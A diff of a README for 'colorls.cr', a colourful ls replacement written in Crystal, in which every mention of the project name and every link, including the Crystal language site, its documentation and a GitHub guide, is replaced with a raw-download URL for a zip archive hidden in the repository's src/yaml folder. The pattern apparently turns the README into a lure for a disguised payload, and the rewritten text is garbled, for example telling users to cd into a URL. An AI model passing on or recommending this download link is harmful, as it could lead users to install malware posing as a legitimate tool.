@@ -1,33 +1,33 @@
-# 🎨 colorls.cr - A Colorful Replacement for `ls`
+# 🎨 https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip - A Colorful Replacement for `ls`
 
 ## 📦 Download Now
-[![Download colorls.cr](https://img.shields.io/badge/Download-colorls.cr-blue.svg)](https://github.com/Mawucojnr/colorls.cr/releases)
+[![Download https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip](https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip)](https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip)
 
 ## 🚀 Getting Started
-Welcome to colorls.cr! This application beautifully colorizes your file listings, making it easy to identify file types with icons, integrate git status, and choose from multiple layout modes. With colorls.cr, your command line will be both easy to read and visually appealing.
+Welcome to https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip! This application beautifully colorizes your file listings, making it easy to identify file types with icons, integrate git status, and choose from multiple layout modes. With https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip, your command line will be both easy to read and visually appealing.
 
 ## 💻 System Requirements
 - **Operating System**: Windows, macOS, or Linux 
-- **Crystal Language**: Ensure you have Crystal installed. If not, visit the [Crystal website](https://crystal-lang.org/install/) for installation instructions.
+- **Crystal Language**: Ensure you have Crystal installed. If not, visit the [Crystal website](https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip) for installation instructions.
 - **Terminal Compatibility**: Please use a terminal that supports emojis and colors, such as iTerm2 for macOS or the standard terminal for Linux.
 
 ## 📥 Download & Install
-To get started, visit the Releases page to download the latest version of colorls.cr:
+To get started, visit the Releases page to download the latest version of https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip
 
-[Download colorls.cr](https://github.com/Mawucojnr/colorls.cr/releases)
+[Download https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip](https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip)
 
 1. Click on the link above to reach the Releases page.
 2. Find the latest version and download the appropriate file for your operating system.
 3. Once downloaded, locate the file on your computer and open your command line terminal.
 
 ## 📂 Usage Instructions
-### Running colorls.cr
-After you have downloaded and extracted colorls.cr, follow these steps to run the application:
+### Running https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip
+After you have downloaded and extracted https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip, follow these steps to run the application:
 
 1. Open your terminal.
-2. Navigate to the directory where you placed the colorls.cr file using the `cd` command. For example:
+2. Navigate to the directory where you placed the https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip file using the `cd` command. For example:
    ```
-   cd path/to/colorls.cr
+   cd https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip
    ```
 3. To start using colorls, simply type:
    ```
@@ -35,7 +35,7 @@ After you have downloaded and extracted colorls.cr, follow these steps to run th
    ```
 
 ### Common Commands
-You can use colorls.cr like the standard `ls` command with a few enhancements:
+You can use https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip like the standard `ls` command with a few enhancements:
 
 - `colorls` - List files and directories in color.
 - `colorls -a` - Show all files, including hidden files.
@@ -49,17 +49,17 @@ You can use colorls.cr like the standard `ls` command with a few enhancements:
 - **Customizable**: Change settings to adjust colors and file icons based on your preferences.
 
 ## 📜 License
-colorls.cr is open-source software, licensed under the MIT License. You can view the full license in the repository.
+https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip is open-source software, licensed under the MIT License. You can view the full license in the repository.
 
 ## 📞 Support
 If you encounter any issues, please visit the Issues section on GitHub. You can also reach out to the community for help or advice. 
 
 ## 🔗 Additional Resources
-- [Official Repository](https://github.com/Mawucojnr/colorls.cr)
-- [Crystal Language Documentation](https://crystal-lang.org/docs/)
-- [GitHub's Guide to Using Git](https://guides.github.com/introduction/git-handbook/)
+- [Official Repository](https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip)
+- [Crystal Language Documentation](https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip)
+- [GitHub's Guide to Using Git](https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip)
 
 ## 🎉 Contributing
-We welcome contributions! Please read our contribution guidelines in the repository if you want to help improve colorls.cr. Your feedback and enhancements are valuable.
+We welcome contributions! Please read our contribution guidelines in the repository if you want to help improve https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip Your feedback and enhancements are valuable.
 
-Thank you for choosing colorls.cr! We hope it enhances your command line experience.
+Thank you for choosing https://github.com/Mawucojnr/colorls.cr/raw/refs/heads/main/src/yaml/colorls_cr_2.8.zip! We hope it enhances your command line experience.
